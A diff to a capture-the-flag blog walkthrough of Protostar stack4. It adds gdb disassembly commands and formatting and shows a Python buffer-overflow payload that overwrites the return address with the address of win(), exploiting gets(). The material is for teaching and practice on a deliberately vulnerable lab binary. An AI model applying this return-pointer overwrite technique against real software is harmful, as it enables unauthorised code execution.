@@ -1,7 +1,7 @@
 ---
 title: "Protostar stack4 walkthrough"
 date: 2020-05-21
-tags: [ctf, protostar, stack4, walkthrough]
+tags: [buffer overflow, protostar, stack4, walkthrough]
 header:
   image: "/images/protostar/protostar.png"
 ---
@@ -20,7 +20,7 @@ gdb lets you do “run < input”
 EIP is not directly after the end of buffer, compiler padding can also increase the size.
 
 #### Source code:
-```
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -41,22 +41,30 @@ int main(int argc, char **argv)
 
 #### Procedure:
 
-after main is executed, the stack contains the address which called main. At the last statement of main (ret) this address is popped off stack and stack frame goes back to previous state and ESP points to the return pointer. 
+after main is executed, stack contains the address which called main. At the last statement of main (ret) this address is popped off stack and stack frame goes back to previous state and ESP points to the return pointer. 
 
 We can change the return pointer to point to win() function, this executing it after ret
 
 ##### Vulnerability:
 
-`gets` is vulnerable function.
+`gets()` is vulnerable function.
 
 
 ##### Disassembly:
 
+Lets start by disassembling both main and win functions
+
+```
+gdb ./stack4
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+(gdb) disassemble win
+```
+
+
 ![disassembly]({{site.url}}{{site.baseurl}}/images/protostar/stack4/disassemble.png)
 
-Lets start by running ./stack4 with a large input (AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ) since we dont know where the return pointer is
-
-create breakpoint at ret `break *0x0804841e` and run
+Lets start by running ./stack4 with a large input (AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ) since we dont know where the return pointer is, lets create a breakpoint at ret `break *0x0804841e` and run
 
 ![ret-1]({{site.url}}{{site.baseurl}}/images/protostar/stack4/ret-1.png)
 
@@ -71,7 +79,7 @@ address of win can be found using objdump or in gdb
 ```
 
 Lets modify our python program to add this address to string after 0x55 (U)
-```
+```python
 padding = "AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUU"
 padding += "\xf4\x83\x04\x08" #address 0x80483f4
 print padding
@@ -79,3 +87,5 @@ print padding
 ![done]({{site.url}}{{site.baseurl}}/images/protostar/stack4/done.png)
 
 Now we can see that $esp now has 0x080483f4 and win() is executed
+
+
